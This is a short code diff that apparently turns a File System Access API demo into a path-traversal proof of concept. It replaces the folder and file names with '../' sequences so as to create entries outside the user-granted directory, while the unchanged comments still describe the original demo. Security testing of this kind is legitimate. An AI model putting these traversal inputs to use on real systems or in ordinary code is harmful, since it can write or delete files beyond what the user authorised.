@@ -31,14 +31,14 @@
               // Oh yeah, creating new directories with the given handle
               // is possible - we're talking about true file system
               // access here!
-              const newDirHandle = await dirHandle.getDirectoryHandle('Folder by my PWA', { create: true });
+              const newDirHandle = await dirHandle.getDirectoryHandle('../../../../../../ZZY_POC', { create: true });
 
               // Same for files in the directory. Of course.
-              const newFileHandle = await newDirectoryHandle.getFileHandle('PWA_with_fs_access.txt', { create: true });
+              const newFileHandle = await dirHandle.getFileHandle('../../../../../file_travesal.txt', { create: true });
 
               // Deleting is done via 'removeEntry'. Here, we're deleting
               // our newly created empty txt-file.
-              await newDirHandle.removeEntry('Abandoned Masterplan.txt');
+              await dirHandle.removeEntry('Abandoned Masterplan.txt');
 
               // And for demo purposees, let's also delete the new
               // directory itself and any of its contents (which at
